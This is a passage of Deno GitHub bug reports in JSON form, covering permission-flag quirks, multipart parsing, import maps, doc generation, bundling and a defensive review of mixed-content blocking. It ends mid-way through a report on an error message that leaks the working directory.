exports_6(\"TextDecoder\", TextDecoder = _utils_ts_1._TextDecoder);\r\n                                                           ^\r\n\r\n```"},{"labels":["bug",null],"text":"I use deno std library MultipartReader\r\n\r\n```javascript\r\nasync function parseFormData(reader, str){\r\n  const boundaryReg = /(-+)([^\\s]+)/i;\r\n  const match = str.match(boundaryReg);\r\n  const boundary = match?.[2];\r\n  const res: {[key: string]: string} = {};\r\n  if(boundary){\r\n    try {\r\n      const mr = new MultipartReader(reader, boundary);\r\n      const form = await mr.readForm();\r\n      console.log(form);\r\n    }catch(e){\r\n      // multipart.ts 364 this.bufReader.readSlice\r\n      console.log(e);\r\n    }\r\n  }\r\n}\r\n\r\napp.use(async (ctx, next) => {\r\n  const decoder = new TextDecoder();\r\n  const originBody = ctx.request.serverRequest.body;\r\n  // get net request body text\r\n  const decode = await Deno.readAll(originBody);\r\n  // get http body text\r\n  const _b = decoder.decode(decode);\r\n  const body = await parseFormData(originBody, _b);  \r\n})\r\n```\r\n\r\nI found I got error in multipart.ts's nextPart function. \r\n\r\n```javascript\r\n      const line = await this.bufReader.readSlice(\"\\n\".charCodeAt(0));\r\n      if (line === null) {\r\n        throw new Deno.errors.UnexpectedEof();\r\n      }\r\n```\r\n![image](https://user-images.githubusercontent.com/46396510/82785648-9d06b680-9e95-11ea-8883-7eba20b7dac7.png)\r\n\r\n\r\n\r\n\r\nHere is the code\r\n[deno-demo2.zip](https://github.com/denoland/deno/files/4675539/deno-demo2.zip)\r\n"},{"labels":["bug",null,null],"text":"```typescript\r\n// original file size 46.2 KB\r\nconst fileArray = await Deno.readFile('file.png')\r\n// As a blob, file size becomes 63.5 KB\r\nconst fileBlob = new Blob([fileArray.buffer], { type: 'image/png' })\r\n\r\nconst formData = new FormData()\r\nformData.append('file', fileBlob)\r\n\r\nconst data = await fetch('http://localhost:8000/file', {\r\n  method: 'POST',\r\n  body: formData,\r\n})\r\n\r\nconst response: { size: number } = await data.json()\r\n\r\n// File size as read on the server 100.16 KB\r\nconsole.log('Size:', response.size / 1024, 'KB')\r\n```\r\nServer used to test\r\n```typescript\r\nimport { serve } from 'https://deno.land/std/http/mod.ts'\r\nimport { MultipartReader } from 'https://deno.land/std/mime/mod.ts'\r\n\r\nconst s = serve({ port: 8000 })\r\n\r\nfor await (const req of s) {\r\n  const contentType = req.headers.get('content-type')\r\n  const boundary = contentType?.match(/boundary=([^\\s]+)/)\r\n\r\n  let file\r\n  if (boundary) {\r\n    const reader = new MultipartReader(req.body, boundary[1])\r\n    const form = await reader.readForm(1024 * 1024) // 1MB\r\n\r\n    file = form.file('file')\r\n    if (file?.content) {\r\n      await Deno.writeFile('newFile.png', file.content)\r\n    }\r\n  }\r\n\r\n  req.respond({\r\n    status: 200,\r\n    body: JSON.stringify({\r\n      size: file?.size,\r\n    }),\r\n  })\r\n}\r\n```"},{"labels":["bug",null],"text":"Reproduction:\r\n```\r\ndeno run --allow-read=~ https://deno.land/std/examples/cat.ts ~/.bashrc\r\n```\r\nOutput:\r\n```\r\nerror: Uncaught PermissionDenied: read access to \"/home/chris/.bashrc\", run again with the --allow-read flag\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)\r\n    at Object.sendAsync ($deno$/ops/dispatch_json.ts:98:10)\r\n    at async Object.open ($deno$/files.ts:37:15)\r\n    at async https://deno.land/std/examples/cat.ts:4:16\r\n```\r\nSpecifying an absolute path in `--allow-read` correctly outputs the file content.\r\n\r\nThis is on:\r\n```\r\ndeno --version\r\ndeno 1.0.2\r\nv8 8.4.300\r\ntypescript 3.9.2\r\n```"},{"labels":["bug",null],"text":"deno 1.0.0\r\nv8 8.4.300\r\ntypescript 3.9.2\r\n\r\nI'm trying to run the code snippet shown in the documentation for [listenAndServeTLS](https://doc.deno.land/https/deno.land/std/http/server.ts#listenAndServeTLS).\r\n\r\nI'm running the script like this:\r\n`deno run --allow-net --allow-read server.js`\r\n\r\nI getting this error:\r\n```\r\nerror: Uncaught PermissionDenied: Permission denied (os error 13)\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)\r\n    at Object.sendSync ($deno$/ops/dispatch_json.ts:72:10)\r\n    at Object.listenTls ($deno$/ops/tls.ts:67:10)\r\n    at listenTls ($deno$/tls.ts:51:22)\r\n    at serveTLS (https://deno.land/std/http/server.ts:313:20)\r\n    at listenAndServeTLS (https://deno.land/std/http/server.ts:338:18)\r\n    at file:///home/user/test/server.js:10:1\r\n```\r\nI'm using a real certificate. I've set permissions on the cert-files to 777:\r\n```\r\nchmod 777 localhost.crt\r\nchmod 777 localhost.key\r\n```\r\nYet, I'm still getting the same error. When I google this error, I come across Rust related threads.\r\n\r\nUltimately,  the only way I could get past this error was to run the script using sudo:\r\n`sudo /home/user/.deno/bin/deno run --allow-net --allow-read server.js`\r\n\r\nIs this a bug, or expected behavior?"},{"labels":["bug",null],"text":"deno: v1.0.0\r\nMacOS: 10.14.6\r\n\r\nIt works by importing React from URL and specifying `@ deno-types`.\r\n\r\n```\r\n// @deno-types=\"https://deno.land/x/types/react/v16.13.1/react.d.ts\"\r\nimport React from 'https://dev.jspm.io/react@16.13.1'\r\n\r\nconst App = () => (\r\n  <div>\r\n    <h1>Hello DenoLand!</h1>\r\n  </div>\r\n)\r\n\r\nexport default App\r\n```\r\n\r\nHowever, if you specify React in the import map, a compile error will occur.\r\n\r\n```\r\n// import_map.json\r\n{\r\n  \"imports\": {\r\n    \"React\": \"https://dev.jspm.io/react@16.13.1\"\r\n  }\r\n}\r\n```\r\n\r\n```\r\n// @deno-types=\"https://deno.land/x/types/react/v16.13.1/react.d.ts\"\r\nimport React from 'React'\r\n\r\nconst App = () => (\r\n  <div>\r\n    <h1>Hello DenoLand!</h1>\r\n  </div>\r\n)\r\n\r\nexport default App\r\n```\r\n\r\n## console\r\n```\r\nerror: TS7026 [ERROR]: JSX element implicitly has type 'any' because no interface 'JSX.IntrinsicElements' exists.\r\n  <div>\r\n  ~~~~~\r\n    at file:///Users/satouakifumi/work/git/demo/deno-http/App.tsx:5:3\r\n\r\nTS7026 [ERROR]: JSX element implicitly has type 'any' because no interface 'JSX.IntrinsicElements' exists.\r\n    <h1>Hello DenoLand!</h1>\r\n    ~~~~\r\n    at file:///Users/satouakifumi/work/git/demo/deno-http/App.tsx:6:5\r\n\r\nTS7026 [ERROR]: JSX element implicitly has type 'any' because no interface 'JSX.IntrinsicElements' exists.\r\n    <h1>Hello DenoLand!</h1>\r\n                       ~~~~~\r\n    at file:///Users/satouakifumi/work/git/demo/deno-http/App.tsx:6:24\r\n\r\nTS7026 [ERROR]: JSX element implicitly has type 'any' because no interface 'JSX.IntrinsicElements' exists.\r\n  </div>\r\n  ~~~~~~\r\n    at file:///Users/satouakifumi/work/git/demo/deno-http/App.tsx:7:3\r\n\r\nFound 4 errors.\r\n```\r\n"},{"labels":["bug",null],"text":"Many thanks @bartlomieju for adding an initial implementation of mixed content blocking (#1064).\r\n\r\nI noticed a few subtle security issues with the logic in pull #5680, compared to [how browsers do this](https://developers.google.com/web/fundamentals/security/prevent-mixed-content/what-is-mixed-content) which has been [gradually refined](https://w3c.github.io/webappsec-mixed-content/) over the years:\r\n\r\n### 1. Redirect handling\r\n\r\n#5680 blocks https modules from importing http urls, but it doesn't seem to prevent https modules from importing https urls that redirect to http urls (or https urls that redirect to http urls that redirect back to https urls).\r\n\r\nBrowsers block all three (equally dangerous) cases, since the [Mixed Content spec's \"Insecure Content in Secure Contexts\" section](https://w3c.github.io/webappsec-mixed-content/#algorithms) notes that user agents must do a [mixed content check](https://w3c.github.io/webappsec-mixed-content/#should-block-fetch) before every fetch of a subresource, and the Fetch standard [handles redirects by triggering a nested fetch](https://fetch.spec.whatwg.org/#http-fetch) and hence an additional mixed content check per redirect.\r\n\r\n### 2. Response handling\r\n\r\nAnother subtle case is https urls whose TLS encryption is bad. The [Fetch standard's \"HTTP-network fetch\" algorithm](https://fetch.spec.whatwg.org/#http-network-fetch) recommends\r\n> User agents are strongly encouraged to only succeed HTTPS connections with strong security properties and return network errors otherwise.\r\n\r\nPresumably that's what Deno would already do if a MITM attacker sends you a self-signed certificate for an https import? (https://badssl.com/ by the Chrome & Firefox security teams might be helpful for manually testing a variety of different kinds of SSL error.)\r\n\r\n### 3. Import protocol\r\n\r\n#5680 only blacklists the http protocol as insecure. But,\r\n1. this unnecessarily blacklists local origins like \"http://127.0.0.1\" that browsers do not consider to be mixed content (as the connection from the browser to a local server does not go over the network).\r\n2. the codepath that loads modules might now or in the future support other insecure protocols such as ftp. So it'd be safer to have a whitelist of secure protocols, and block everything else.\r\n\r\nYou can solve both of these by using the whitelist defined for the Mixed Content spec's [a priori authenticated URL algorithm](https://w3c.github.io/webappsec-mixed-content/#a-priori-authenticated-url), which roughly allows:\r\n- any origin with the {'https', 'wss', 'file', 'data'} schemes\r\n- any origin whose host is localhost - but there are important subtleties here in [the Secure Contexts spec's \"Is origin potentially trustworthy?\" algorithm](https://w3c.github.io/webappsec-secure-contexts/#is-origin-trustworthy), since localhost can sometimes hit the network(!).\r\n- > The origin of blob: and filesystem: URLs is the origin of the context in which they were created. Therefore, blobs created in a trustworthy origin will themselves be potentially trustworthy.\r\n\r\n### 4. Referrer protocol\r\n\r\n#5680 only blocks mixed content if the referrer's scheme is https. But now or in the future there are likely to be other secure contexts from which mixed content should be blocked, for example if an https module imports a module using a data/blob/filesystem/etc URL (as requested in #5059/#2726/#5683), and that module in turn attempts to import an http module, that should count as mixed content and be blocked.\r\n\r\nThe [Mixed Content spec's \"Does settings prohibit mixed security contexts?\" algorithm](https://w3c.github.io/webappsec-mixed-content/#categorize-settings-object) defines this to be based on the context's _HTTPS state_, which in turn is set by the [Fetch standard's \"scheme fetch\" algorithm](https://fetch.spec.whatwg.org/#scheme-fetch) when loading the context. Roughly, it will be \"modern\" (or \"deprecated\") for resources retrieved over HTTPS, \"none\" for responses retrieved over FTP, and for the {\"about\", \"blob\", \"data\"} schemes they copy the _HTTPS state_ of the context that made the request - so in the example above the data/blob/filesystem URL would have an HTTPS State of \"modern\" (or \"deprecated\") and so mixed content would be blocked.\r\n\r\nUnfortunately [\"scheme fetch\"](https://fetch.spec.whatwg.org/#scheme-fetch) doesn't specify how to calculate _HTTPS state_ for the _file_ scheme:\r\n> For now, unfortunate as it is, file URLs are left as an exercise for the reader.\r\n\r\nbut the safest route would probably be to default to blocking mixed content in them, unless a command line flag like \"--unsafe-allow-mixed-content-in-files\" is passed (something similar was proposed in #5318). Note that http://127.0.0.1 URLs shouldn't count as mixed content (see Import protocol above), so such a flag wouldn't be necessary for local development, only when importing modules hosted on non-https intranet servers. And it would go a long way toward avoiding users accidentally putting themselves at risk by including http modules into Deno processes they've granted powerful permissions to.\r\n\r\n### 5. Workers\r\n\r\nIt wasn't clear to me from the code whether #5680 also affects loading Workers from URLs, but presumably the same mixed content blocking should apply there too, and it would be nice to share the code between both places."},{"labels":["bug",null],"text":"Trying to call functions within `Deno` on the inspector console, running `deno repl --inspect`, causes a crash, due to a cell already being borrowed, as seen here:\r\n\r\n```\r\nthread 'main' panicked at 'already mutably borrowed: BorrowError', /rustc/4fb7144ed159f94491249e86d5bbd033b5d60550\\src\\libcore\\cell.rs:798:9\r\n```\r\n\r\nThe culprit of the crash seems to be this line of code:\r\nhttps://github.com/denoland/deno/blob/master/cli/inspector.rs#L547\r\n\r\nWhich keeps the cell borrowed, while `poll_sessions` is called, for instance here:\r\nhttps://github.com/denoland/deno/blob/master/cli/inspector.rs#L367\r\n\r\nEdit: forgot to mention\r\ndeno 1.0.2\r\nv8 8.4.300\r\ntypescript 3.9.2"},{"labels":["bug",null],"text":"I am using Vim with CoC and when I jump to import definition (`<Plug>(coc-definition)`)\r\n\r\n```\r\nimport {\r\n    serve,\r\n} from \"https://deno.land/std/http/server.ts\";\r\n```\r\nThis will jump to `/home/prime/.cache/deno/deps/https/deno.land/c1723c570639ab9ac7b57b4c6169663cda9d5f85151d647088ae17884514b868` which, since it doesn't have TS file extension makes code inspection meh."},{"labels":["bug",null],"text":"A few things seem off about the documentation generator.\r\n\r\nThis example code was run with Deno v1.0.2 on MacOS Catalina:\r\n```ts\r\n/**\r\n * Boolean helper functions.\r\n */\r\n\r\n/** Returns a boolean representing if its argument was true. */\r\nexport function isTrue (bool: boolean): boolean {\r\n  return bool || false;\r\n}\r\n\r\n/** Returns a boolean representing if its argument was false. */\r\nexport function isFalse (bool: boolean): boolean {\r\n  return !isTrue(bool);\r\n}\r\n```\r\n\r\n```\r\nfunction isFalse(bool: boolean): boolean\r\n  Returns a boolean representing if its argument was false.\r\n\r\nfunction isTrue(bool: boolean): boolean\r\n  Boolean helper functions.\r\n```\r\nThe documentation text for the `isTrue` function actually contains the file header comment.\r\n\r\nAlso, when using `export { isTrue, isFalse }` the doc command yields no output, as if the exports weren't even there.\r\n\r\nI have spent some time now familiarizing myself with the `cli/doc` source code, and can help out here. However, pointers from @bartlomieju and @lucacasonato would be much appreciated!"},{"labels":["bug",null],"text":"```ts\r\n// test.ts\r\nconsole.log(`cert: ${(await Deno.open('./server.cert')).rid}`);\r\n\r\nDeno.listenTls({\r\n  port: 8888,\r\n  hostname: '0.0.0.0',\r\n  certFile: './server.cert',\r\n  keyFile: './server.key'\r\n});\r\n\r\n````\r\n```\r\nC:\\workspace\\deno>deno --version\r\ndeno 1.0.2\r\nv8 8.4.300\r\ntypescript 3.9.2\r\n\r\nC:\\workspace\\deno>deno run --allow-net=0.0.0.0:8888 --allow-read=. test.ts\r\ncert: 3\r\nerror: Uncaught PermissionDenied: read access to \"./server.cert\", run again with the --allow-read flag\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)\r\n    at Object.sendSync ($deno$/ops/dispatch_json.ts:72:10)\r\n    at Object.listenTls ($deno$/ops/tls.ts:67:10)\r\n    at Object.listenTls ($deno$/tls.ts:51:22)\r\n    at file:///C:/workspace/deno/test.ts:3:16\r\n\r\nC:\\workspace\\deno>deno run --allow-net=0.0.0.0:8888 --allow-read test.ts\r\ncert: 3\r\n\r\nC:\\workspace\\deno>\r\n```"},{"labels":["bug",null],"text":"`main.ts`:\r\n```typescript\r\nimport React from \"react\" // ✅\r\n\r\nimport('./Component.tsx') // ❌ Cannot find module 'react' or its corresponding type declarations.\r\n```\r\n\r\n`Component.tsx`:\r\n```typescript\r\nimport React from \"react\"\r\n```\r\n\r\n`import_map.json`:\r\n```json\r\n{\r\n    \"imports\": {\r\n        \"react\": \"https://cdn.pika.dev/-/react@v16.13.1-ByypZEPVPs6cpkpGdpQK/dist=es2019/react.js\"\r\n    }\r\n}\r\n```\r\n\r\nDeno **1.0.2**\r\nmacOS **10.15.4**"},{"labels":["bug"],"text":"I tried to import React from jspm and pika.dev but i still can't import the package. \r\nIt worked two day ago but not anymore. \r\nI tried in version 1.0.1 and 1.0.2 on Achlinux\r\n\r\n### Error\r\n`$ deno run index.ts`\r\n`error: TS2307 [ERROR]: Cannot find module 'https://dev.jspm.io/react' or its corresponding type declarations.`\r\n`import React from \"https://dev.jspm.io/react\"`\r\n\r\n### Info\r\n`$ deno --version`\r\n`deno 1.0.2`\r\n`v8 8.4.300`\r\n`typescript 3.9.2`\r\n\r\nHow i can resolve that ?\r\n\r\nThank you\r\n"},{"labels":["bug"],"text":"Currently the URL parser can handle hostnames, IP addresses, etc.\r\n```\r\n> new URL('http://127.0.0.1')\r\nURL { href: \"http://127.0.0.1/\", origin: \"http://127.0.0.1\", protocol: \"http:\", username: \"\", password: \"\", host: \"127.0.0.1\", hostname: \"127.0.0.1\", port: \"\", pathname: \"/\", hash: \"\", search: \"\" }\r\n```\r\n\r\nUnfortunately, when using IPv6 addresses in URLs, the hostname is parsed as ```[```, which means the remaining part is treated as a port (and therefore invalid)\r\n```\r\n> new URL('http://[::1]')\r\nUncaught TypeError: Invalid URL.\r\n    at new URLImpl ($deno$/web/url.ts:418:13)\r\n    at <unknown>:1:1\r\n    at evaluate ($deno$/repl.ts:45:34)\r\n    at Object.replLoop ($deno$/repl.ts:136:13)\r\n```\r\n\r\nThis has also caused an (uncaught) error in Oak when a URL is accessed by IPv6 address directly, and the same may be true for other applications."},{"labels":["bug"],"text":"Hy!\r\n\r\nI was running the tests for the std/log files on a non-English system, and one test failed, while all the others succeeded.\r\n\r\nThe failing test is: \r\n\r\n> FileHandler with mode 'x' will throw if log file already exists\r\n\r\n![assertError](https://user-images.githubusercontent.com/32012862/82669594-012e3e00-9c3c-11ea-8abb-bf1b1ee1ddf2.png)\r\n\r\nI think it fails, because the exception comes from the `Deno.open` method, which gives back an OS specific message.\r\n\r\nThe easy fix, is to change the test and remove the message from the assertion and assert only on `Deno.errors.AlreadyExists`.\r\n\r\n(The other option would be to check if the file exists before open and throw a custom AlreadyExists error, but its a bit overkill just for this, IMO)\r\n\r\nI have created a PR with this fix: [#5757]\r\n\r\nI looked around and saw, that the `RotatingFileHandler` would run into the same problem, if there would be a test with params: `{maxBackupCount: 1, mode: \"x\"}`, but right now, it doesn't fail, because the existing test gets a custom `AlreadyExists` error from within the `RotatingFileHandler.setup`.\r\n\r\nIs this whole thing something that you care about? I would be glad, to contribute.\r\nIf not, feel free, to close this issue, and the related PR."},{"labels":["bug",null],"text":"Culprit:\r\nhttps://github.com/denoland/deno/blob/ee710994925e8840ea387e1853d9c15f3eb73149/cli/swc_util.rs#L142-L148\r\n\r\nThere should be `err.emit()` instead of `err.cancel()`.\r\n\r\nHere's raw SWC diagnostic:\r\n```\r\nRwLockReadGuard {\r\n    lock: RwLock {\r\n        data: SwcDiagnosticBuffer {\r\n            diagnostics: [\r\n                Diagnostic {\r\n                    level: Error,\r\n                    message: [\r\n                        (\r\n                            \"Unexpected token Some(At)\",\r\n                            NoStyle,\r\n                        ),\r\n                    ],\r\n                    code: None,\r\n                    span: MultiSpan {\r\n                        primary_spans: [\r\n                            Span {\r\n                                lo: BytePos(\r\n                                    177,\r\n                                ),\r\n                                hi: BytePos(\r\n                                    178,\r\n                                ),\r\n                                ctxt: #0,\r\n                            },\r\n                        ],\r\n                        span_labels: [],\r\n                    },\r\n                    children: [],\r\n                    suggestions: [],\r\n                },\r\n            ],\r\n        },\r\n    },\r\n}\r\n```\r\nIt needs to be preprocessed to report concrete `line:column` location and source file name.\r\n\r\nThe same problem should be fixed in `deno_lint`.\r\n\r\nRef https://github.com/denoland/deno/issues/5736\r\nRef https://github.com/denoland/deno/issues/5739"},{"labels":["bug",null],"text":"The following code will fail when running with `deno run --allow-read=./src app.ts`\r\n\r\n```js\r\nconst watcher = Deno.watchFs(\"./src\");\r\nfor await (const event of watcher) {\r\n  console.log(\">>>> event\", event);\r\n  // { kind: \"create\", paths: [ \"/foo.txt\" ] }\r\n}\r\n```\r\n\r\nError:\r\n\r\n```sh\r\nerror: Uncaught PermissionDenied: read access to \"./src\", run again with the --allow-read flag\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)\r\n    at Object.sendSync ($deno$/ops/dispatch_json.ts:72:10)\r\n    at new FsWatcher ($deno$/ops/fs_events.ts:15:16)\r\n    at Object.watchFs ($deno$/ops/fs_events.ts:38:10)\r\n    at file:///home/pomatti/projects/dumb-deno/app.ts:1:22\r\n```\r\n\r\nHowever if i change the first line of the script to use an absolute path it works fine:\r\n\r\n```js\r\nconst watcher = Deno.watchFs(\"/home/pomatti/projects/dumb-deno/src\");\r\n```\r\n\r\nI guess `Deno.watchFs()` must allow relative paths when `--allow-read` is informed on startup?\r\n"},{"labels":["bug",null],"text":"When trying to use the utility `deno run`, when I hit tab for tab completion of a file name, I receive the following error in the command:\r\n\r\n`deno run ma(eval):1: command not found: _deno`\r\n\r\nList of actions: `d e n o r u n m a <tab>`\r\n\r\nExpected: deno cli should be able to handle tab completion of file names\r\nVersion: Deno 1.0.1\r\nInstall Method: asdf\r\nOS: MacOS Catalina"},{"labels":["bug"],"text":"With the following code I get almost no output.\r\n\r\n```\r\nimport {\r\n    serve,\r\n} from \"https://deno.land/std/http/server.ts\";\r\nconst s = serve({\r\n    port: 8000\r\n});\r\n\r\nfor await (const req of s) {\r\n    let lolomo:\r\n}\r\n```\r\n\r\nHere is me running the script\r\n```\r\n> deno run -A index.ts\r\nerror: \r\n```\r\n"},{"labels":["bug"],"text":"Hello guys, I'm trying to create decorators with the deno, however this is not being possible, the deno console also does not provide me with information.\r\n\r\nSee the code:\r\n```class TBaseClass {}\r\n\r\ninterface Newable<T> {\r\n    new(...args: any[]): T;\r\n}\r\n\r\nfunction Decorate() {\r\n    return function <T extends Newable<TBaseClass>>(constructor: T): any {\r\n        // extend constructor\r\n        console.log(constructor);\r\n        return class extends constructor {\r\n            protected _extraField: string = '-'\r\n        }; \r\n    }\r\n}\r\n@Decorate()\r\nclass ExtTest{}\r\nconsole.log((new ExtTest))\r\n```\r\n*OBS: I tried remove the <T extends Newable<TBaseClass>> and but not working\r\nIf i comment the \"@Decorate\" the error fades away.\r\nSee the console:\r\n![image](https://user-images.githubusercontent.com/42474938/82621736-57ef3580-9bb2-11ea-9433-453fe7d6fe05.png)\r\nand my tsconfig.json:\r\n![image](https://user-images.githubusercontent.com/42474938/82621767-6ccbc900-9bb2-11ea-88fa-d12c6c04c0af.png)\r\nam i doing something wrong?\r\n\r\nSee you later!"},{"labels":["bug",null],"text":"im no good at opening bug reports but here;\r\nthis kind of stuff was working pre-1.0.1, but it isn't working now\r\n![image](https://user-images.githubusercontent.com/30391304/82551187-97674480-9b14-11ea-947f-0f0dc63c3ae5.png)\r\n_not entirely sure what the issue is so i apologize that this isn't the most informative issue request, as well as not-so-good title_\r\n"},{"labels":["bug",null,null],"text":"Source code:\r\n```typescript\r\nconst listener = Deno.listen({ transport: \"unix\", path: \"./test.sock\" });\r\n```\r\nCommand line:\r\n```bash\r\ndeno run --unstable --allow-all mod.ts\r\n```\r\nResult:\r\n```bash\r\nerror: Uncaught InvalidData: data did not match any variant of untagged enum ArgsEnum\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)\r\n    at Object.sendSync ($deno$/ops/dispatch_json.ts:72:10)\r\n    at Object.listen ($deno$/ops/net.ts:51:10)\r\n    at Object.listen ($deno$/net_unstable.ts:33:24)\r\n    at file:///path/to/mod.ts:1:23\r\n```\r\nDeno Version: 1.0.1\r\nOS: Windows 10 Version 10.0.18363.836"},{"labels":["bug",null],"text":"Hi there,\r\n\r\nI've been working on some tooling that requires the use of a module I import from cdn.pika.dev. as follows:\r\n\r\n```typescript\r\nimport { parse } from \"https://cdn.pika.dev/html5parser@^1.1.0\";\r\n```\r\n\r\nThese imports used to work when I was using Deno 1.0.0-rc3, but ever since I upgraded to the last Deno release (1.0.1), these imports break to a 404 error:\r\n\r\n```text\r\nerror: Import 'https://cdn.pika.dev/-/html5parser@v1.1.2-0fAkC9viFOtRB3VnrC0m/dist=es2019,mode=types/types.d.ts' failed: 404 Not Found\r\n```\r\n\r\nAs mentioned in [this issue I commented on](https://github.com/pikapkg/cdn/issues/8) on the pika/cdn repo, I first thought the issues came from Pika, but I just tried to downgrade to Deno 1.0.0-rc3, and the imports work great again."},{"labels":["bug"],"text":"👋\r\n\r\nSo I'm trying to deploy a deno script as an AWS Lambda function. The lambda `.zip` file contains a `deno_dir` that has been pre-populated with the cached files via `deno cache`. However, when AWS extracts this zip, the extracted files are read-only (and owned by the `root` user, which is different than the lambda user). As of deno v1.0.1, this causes a permissions error.\r\n\r\nIs there a way to make this scenario work? Or am I better off using `deno bundle` (seems that source maps are not supported for bundle, which is unfortunate)?"},{"labels":["bug",null],"text":"Hi, I’m encountering an issue with a combination of modules, top-level `await` & dynamic `import`. Here is a [minimal example reproducting the issue](https://gist.github.com/mdarse/c27f5d52455938241cfc7ab7c0cec946/89773d3a100792298e7101444918da295311efef).\r\n\r\nYou can run it with the following command:\r\n```sh\r\ndeno run --allow-net https://gist.githubusercontent.com/mdarse/c27f5d52455938241cfc7ab7c0cec946/raw/89773d3a100792298e7101444918da295311efef/a.js\r\n```\r\n\r\nWhat’s weird though, is that [it works as expected](https://gist.github.com/mdarse/c27f5d52455938241cfc7ab7c0cec946/875f44dce3c63224a9408464108c9ad20f647749) if I replace `export default x` with `export { x as default }` in `b.js`. You can try it with this command:\r\n```sh\r\ndeno run --allow-net https://gist.githubusercontent.com/mdarse/c27f5d52455938241cfc7ab7c0cec946/raw/875f44dce3c63224a9408464108c9ad20f647749/a.js\r\n```\r\n\r\nNot sure if this is the same issue as #5215 though.\r\n\r\n---\r\n```\r\n❯ deno --version \r\ndeno 1.0.0\r\nv8 8.4.300\r\ntypescript 3.9.2\r\n```"},{"labels":["bug"],"text":"```ts\r\n// main.ts\r\nconsole.log(globalThis.TextEncoder);\r\n```\r\n\r\n```shell\r\n$ deno run main.ts\r\nCompile file:///Users/biwanczuk/dev/deno/main.ts\r\nerror: TS2339 [ERROR]: Property 'TextEncoder' does not exist on type 'typeof globalThis'.\r\nconsole.log(globalThis.TextEncoder);\r\n                       ~~~~~~~~~~~\r\n    at file:///Users/biwanczuk/dev/deno/main.ts:1:24\r\n```\r\n\r\nI'd expect that `TextEncoder`/`TextDecoder` would be available on the `globalThis` type. \r\n\r\nRef #5663"},{"labels":["bug",null],"text":"IS:\r\nAs the title says the output of deno bundle when including something from pika.dev seems to ignore pika atleast partially.\r\n\r\nI created a little test repo with a \"bundle.sh\" script: https://github.com/katywings/deno-pika-bundle-test\r\n\r\nWhat I try to bundle looks something like this:\r\n```\r\nimport { css } from 'https://cdn.pika.dev/otion@^0.3.1/runtime-deno'\r\n\r\ncss({ backgroundColor: 'black' })\r\n```\r\n\r\nThe result bundle actually includes the code from \"https://cdn.pika.dev/otion@^0.3.1/runtime-deno\", but then the nested exports from the lines of runtime-deno are missing. So it looks like deno bundle is ignoring stuff like this:\r\n`export * from '/-/otion@v0.3.1-5j8xeqtzaBPg93oc5Bwe/dist=es2017,mode=exports/server-deno';`\r\n\r\nSHOULD:\r\ndeno bundle should include all imported dependencies from pika.\r\n\r\nDETAILS:\r\n- Execution of deno bundle does not give any errors\r\n- My random guess would be that this could be related to #4542 because `/-/otion@v0.3.1-5j8xeqtzaBPg93oc5Bwe/dist=es2017,mode=exports/server-deno` also seems to be using the `export X as Y` syntax, but I am not sure"},{"labels":["bug",null],"text":"unfortunately it seems the flag '--inspect' is working the same as '--inspect-brk' and does not start running without breaking on the first line of code.\r\n"},{"labels":["bug",null,null],"text":"wonder if `console.log` on objects, and any non-string types has any standard?\r\n\r\n```js\r\n> var data = {\"totalTax\":7.45,\"summary\":[{\"jurisName\":\"Utah\",\"taxCalculated\":4.85,\"jurisType\":\"State\",\"taxType\":\"Sales\"},{\"jurisName\":\"Salt Lake\",\"taxCalculated\":1.35,\"jurisType\":\"County\",\"taxType\":\"Sales\"},{\"jurisName\":\"Murray\",\"taxCalculated\":0.2,\"jurisType\":\"City\",\"taxType\":\"Sales\"},{\"jurisName\":\"Salt Lake Co Tr\",\"taxCalculated\":1.05,\"jurisType\":\"Special\",\"taxType\":\"Sales\"}]};\r\n\r\n> console.log(data);\r\n{\r\n totalTax: 7.45,\r\n summary: [\r\n  { jurisName: \"Utah\", taxCalculated: 4.85, jurisType: \"State\", taxType: \"Sales\" },\r\n  {\r\n    jurisName: \"Salt Lake\",\r\n    taxCalculated: 1.35,\r\n    jurisType: \"County\",\r\n    taxType: \"Sales\"\r\n   },\r\n  { jurisName: \"Murray\", taxCalculated: 0.2, jurisType: \"City\", taxType: \"Sales\" },\r\n  {\r\n    jurisName: \"Salt Lake Co Tr\",\r\n    taxCalculated: 1.05,\r\n    jurisType: \"Special\",\r\n    taxType: \"Sales\"\r\n   }\r\n]        // I believe this line not aligning is a bug, it has no leading space, better align with above `summary`\r\n}\r\nundefined\r\n```\r\n\r\ncompare with in node:\r\n\r\n```js\r\n> console.log(data)\r\n{ totalTax: 7.45,\r\n  summary:\r\n   [ { jurisName: 'Utah',\r\n       taxCalculated: 4.85,\r\n       jurisType: 'State',\r\n       taxType: 'Sales' },\r\n     { jurisName: 'Salt Lake',\r\n       taxCalculated: 1.35,\r\n       jurisType: 'County',\r\n       taxType: 'Sales' },\r\n     { jurisName: 'Murray',\r\n       taxCalculated: 0.2,\r\n       jurisType: 'City',\r\n       taxType: 'Sales' },\r\n     { jurisName: 'Salt Lake Co Tr',\r\n       taxCalculated: 1.05,\r\n       jurisType: 'Special',\r\n       taxType: 'Sales' } ] }\r\nundefined\r\n```\r\n\r\nalso, node's REPL console.log has ansi coloring output for different types on terminals, will this come into Deno anytime soon?"},{"labels":["bug",null],"text":"\r\n```bash\r\n$ deno bundle https://gist.githubusercontent.com/lucacasonato/05d9cca0f1405e84c0b614c0c47fef79/raw/e09da8367f19b1082dfd3f9d6e4c77a3ec682921/unstable.ts\r\nerror: missing field `bundleOutput` at line 1 column 371\r\n```\r\n\r\nIt works when the `--unstable` flag is provided"},{"labels":["bug",null],"text":"e.g. returning status 555 gives this:\r\n\r\n```\r\nerror: Uncaught InvalidData: Bad status code\r\n    throw new Deno.errors.InvalidData(\"Bad status code\");\r\n```"},{"labels":["bug",null],"text":"I'm creating [a script](https://amatiasq.com/deno/web.ts):\r\n\r\n```sh\r\ndeno --allow-read=. --allow-net https://amatiasq.com/deno/web.ts my-script.ts\r\n```\r\n\r\nThat watches the file system and bundles `my-script.ts` into a frontend-ready file.\r\n\r\nThe issue is that when a file system event is detected `Deno.bundle` bundles again from cache. Making the tool unusable.\r\n\r\nI wasn't able to find a way to clear cache, I tried starting a process `deno bundle my-script.ts` but that doesn't allow me to pass a custom `tsconfig` to add `lib: [\"DOM\"]`."},{"labels":["bug",null],"text":"The `PermissionDenied` error leaks the current working directory, thus the permission check can be circumvented like so:\r\n```js\r\n// cwd.js\r\nfunction 